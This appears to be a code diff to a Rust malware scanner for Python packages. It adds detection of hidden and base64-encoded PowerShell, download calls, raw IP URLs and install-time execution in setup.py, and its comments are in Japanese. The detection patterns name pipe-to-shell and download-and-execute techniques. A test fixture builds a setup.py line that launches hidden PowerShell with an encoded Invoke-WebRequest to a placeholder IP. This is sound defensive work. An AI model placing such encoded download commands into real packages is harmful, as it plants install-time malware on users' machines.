@@ -90,6 +90,10 @@ fn re_pipe_sh() -> &'static Regex {
     static R: OnceLock<Regex> = OnceLock::new();
     R.get_or_init(|| Regex::new(r"(?:^|[^|])\|\s*(?:sudo\s+)?(?:sh|bash|zsh|python3?|node|iex)\b").unwrap())
 }
+fn re_ps_enc() -> &'static Regex {
+    static R: OnceLock<Regex> = OnceLock::new();
+    R.get_or_init(|| Regex::new(r"\s-(?:e|ec|enc|encodedcommand)\s+[a-z0-9+/=]{20,}").unwrap())
+}
 fn re_ws_hide() -> &'static Regex {
     static R: OnceLock<Regex> = OnceLock::new();
     R.get_or_init(|| Regex::new(r"\S[ \t]{150,}\S").unwrap())
@@ -139,8 +143,15 @@ pub fn decode_b64_runs(line: &str) -> Vec<String> {
             [&base64::engine::general_purpose::STANDARD_NO_PAD, &base64::engine::general_purpose::URL_SAFE_NO_PAD]
         {
             if let Ok(b) = eng.decode(t) {
-                if let Ok(txt) = String::from_utf8(b) {
-                    if txt.chars().all(|c| !c.is_control() || c == '\n' || c == '\t') {
+                // PowerShell の -EncodedCommand は UTF-16LE
+                let txt = if b.len() >= 4 && b.len() % 2 == 0 && b.iter().skip(1).step_by(2).all(|x| *x == 0) {
+                    let u: Vec<u16> = b.chunks(2).map(|c| u16::from_le_bytes([c[0], c[1]])).collect();
+                    String::from_utf16(&u).ok()
+                } else {
+                    String::from_utf8(b).ok()
+                };
+                if let Some(txt) = txt {
+                    if txt.chars().all(|c| !c.is_control() || c == '\n' || c == '\t' || c == '\r') {
                         out.push(txt);
                         break;
                     }
@@ -252,9 +263,10 @@ pub fn scan_lines(path: &str, lines: &[(usize, String)], lists: &Lists) -> Vec<F
     let mut fetch_call: Option<(usize, String)> = None;
     let mut spawn_mod = false;
     let mut spawn_call: Option<(usize, String)> = None;
+    // 読み込み・導入だけで動く場所：__init__.py（import 時）と setup.py（sdist の導入時）
     let is_init = {
         let name = path.rsplit('/').next().unwrap_or(path);
-        name == "__init__.py"
+        name == "__init__.py" || name == "setup.py"
     };
 
     for (n, line) in lines {
@@ -355,6 +367,9 @@ pub fn scan_lines(path: &str, lines: &[(usize, String)], lists: &Lists) -> Vec<F
                     }
                     if in_list(&h, lists.chain_rpc) || has_suffix(&h, lists.chain_rpc_suffixes) {
                         push(&mut out, "chain_rpc", *n, &format!("（デコード後）{dec}"));
+                    }
+                    if is_public_ipv4(&h) {
+                        push(&mut out, "raw_ip_url", *n, &format!("（デコード後）{dec}"));
                     }
                 }
             }
@@ -475,6 +490,21 @@ pub fn scan_lines(path: &str, lines: &[(usize, String)], lists: &Lists) -> Vec<F
         }
         if compact.contains("start_new_session=true") && (spawn.is_some() || spawn_mod) {
             push(&mut out, "detach", *n, line);
+        }
+
+        // 隠した PowerShell（-EncodedCommand・-WindowStyle Hidden）
+        if l.contains("powershell") || l.contains("pwsh") {
+            if re_ps_enc().is_match(&l) || l.contains("-windowstyle hidden") || l.contains("-w hidden") {
+                push(&mut out, "obfuscation", *n, line);
+                spawn.get_or_insert((*n, line.clone()));
+            }
+            if l.contains("downloadstring(")
+                || l.contains("invoke-webrequest")
+                || l.contains("iwr ")
+                || l.contains("downloadfile(")
+            {
+                push(&mut out, "download_exec", *n, line);
+            }
         }
 
         // CI のシークレット
@@ -644,6 +674,23 @@ def _start():
         // 取得だけ・起動だけでは出ない
         assert!(run("pkg/net.py", "import requests\nr = requests.get(url)\n").is_empty());
         assert!(run("pkg/cli.py", "import subprocess\nsubprocess.run(['git', 'status'])\n").is_empty());
+    }
+
+    #[test]
+    fn powershell_encoded() {
+        // 合成：UTF-16LE で "Invoke-WebRequest -Uri \"https://203.0.113.9/a\"" を base64 にしたもの
+        let enc: String = {
+            let s = "Invoke-WebRequest -Uri \"https://203.0.113.9/a\"";
+            let b: Vec<u8> = s.encode_utf16().flat_map(|u| u.to_le_bytes()).collect();
+            base64::engine::general_purpose::STANDARD.encode(b)
+        };
+        let t = format!(
+            "import subprocess\nsubprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand {enc}', shell=True)\n"
+        );
+        let f = run("setup.py", &t);
+        for want in ["hidden_url", "import_time_exec", "obfuscation", "raw_ip_url"] {
+            assert!(f.contains(&want.to_string()), "{want} が出ない: {f:?}");
+        }
     }
 
     #[test]
